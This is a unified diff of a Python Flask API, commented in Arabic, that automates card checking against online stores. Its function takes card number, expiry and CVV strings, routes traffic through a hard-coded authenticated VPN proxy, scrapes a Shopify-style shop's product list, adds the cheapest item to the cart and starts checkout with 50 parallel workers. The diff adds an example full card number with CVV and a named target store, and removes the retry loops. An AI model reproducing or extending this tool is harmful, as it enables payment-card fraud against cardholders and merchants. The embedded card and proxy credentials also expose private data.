@@ -1,4 +1,4 @@
-# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة وإعادة المحاولة
+# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة
 import time
 import re
 import json
@@ -23,17 +23,18 @@ app = Flask(__name__)
 # ==================== إعدادات الأداء ====================
 MAX_WORKERS = 50
 REQUEST_TIMEOUT = 60
-MAX_RETRIES = 3
 TASK_QUEUE = queue.Queue()
 executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
 
-logging.basicConfig(level=logging.WARNING)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 def ff(ccx, site):
     """
     ccx: رقم البطاقة|الشهر|السنة|cvv
+    مثال: '4918460118934875|08|2027|293'
     site: رابط الموقع
+    مثال: 'https://www.militadowatch.com/'
     """
     
     shipping_data = {
@@ -70,12 +71,15 @@ def ff(ccx, site):
     order_number = None
     payment_status = None
     
-    # ==================== 1. جلب رابط الدفع مع إعادة المحاولة ====================
+    # ==================== 1. جلب رابط الدفع ====================
     try:
         proxy = "px440401.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
         ip, port, user, pwd = proxy.split(":")
         proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
         proxies = {"http": proxy_url, "https": proxy_url}
+        
+        s = requests.Session()
+        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
         
         digital_keywords = [
             'worry-free', 'protection', 'insurance', 'warranty', 'digital', 
@@ -83,24 +87,9 @@ def ff(ccx, site):
             'service', 'guarantee', 'support'
         ]
         
-        # ==================== إعادة محاولة جلب المنتجات ====================
-        r = None
-        for attempt in range(MAX_RETRIES):
-            try:
-                s = requests.Session()
-                s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
-                r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=10)
-                if r.status_code == 200:
-                    break
-                logger.warning(f"⚠️ محاولة جلب المنتجات {attempt + 1}/{MAX_RETRIES} فشلت - Status: {r.status_code}")
-            except Exception as e:
-                logger.warning(f"⚠️ محاولة جلب المنتجات {attempt + 1}/{MAX_RETRIES} فشلت: {str(e)}")
-            
-            if attempt < MAX_RETRIES - 1:
-                time.sleep(2)
-        
-        if r is None or r.status_code != 200:
-            return {"success": False, "code": None, "error": "Failed to fetch products after 3 attempts"}
+        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=10)
+        if r.status_code != 200:
+            return {"success": False, "code": None, "error": "Failed to fetch products"}
         
         products_data = r.json()
         shippable_products = []
@@ -137,40 +126,11 @@ def ff(ccx, site):
         variant_id = cheapest['variant_id']
         total_amount = f"${cheapest['price']:.2f}"
         
-        # ==================== إعادة محاولة إضافة للسلة ====================
-        resp = None
-        for attempt in range(MAX_RETRIES):
-            try:
-                s = requests.Session()
-                s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
-                resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=10)
-                if resp.status_code == 200:
-                    break
-            except:
-                pass
-            if attempt < MAX_RETRIES - 1:
-                time.sleep(2)
+        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=10)
+        if resp.status_code != 200:
+            return {"success": False, "code": None, "error": "Failed to add to cart"}
         
-        if resp is None or resp.status_code != 200:
-            return {"success": False, "code": None, "error": "Failed to add to cart after 3 attempts"}
-        
-        # ==================== إعادة محاولة الذهاب للدفع ====================
-        response = None
-        for attempt in range(MAX_RETRIES):
-            try:
-                s = requests.Session()
-                s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
-                response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=10)
-                if response.status_code == 200:
-                    break
-            except:
-                pass
-            if attempt < MAX_RETRIES - 1:
-                time.sleep(2)
-        
-        if response is None or response.status_code != 200:
-            return {"success": False, "code": None, "error": "Failed to get checkout after 3 attempts"}
-        
+        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=10)
         checkout_url = response.url
         
     except Exception as e:
@@ -467,15 +427,17 @@ def ff(ccx, site):
                 'Free Postal Shipping',
                 'UPS',
                 'DELIVERY_PHONE_NUMBER_REQUIRED',
-                'Economy',
-                'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
-                'First', 
-                'by-items', 
-                'Standard', 
-                'Priority', 
-                'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
-                'GroundAdvantage', 
-                'MediaMail'
+             'Economy',
+             'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
+            'First', 
+            'by-items', 
+            'Standard', 
+            'Priority', 
+            'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
+            'GroundAdvantage', 
+            'MediaMail'
+           
+             
             ]
             
             for attempt in range(10):
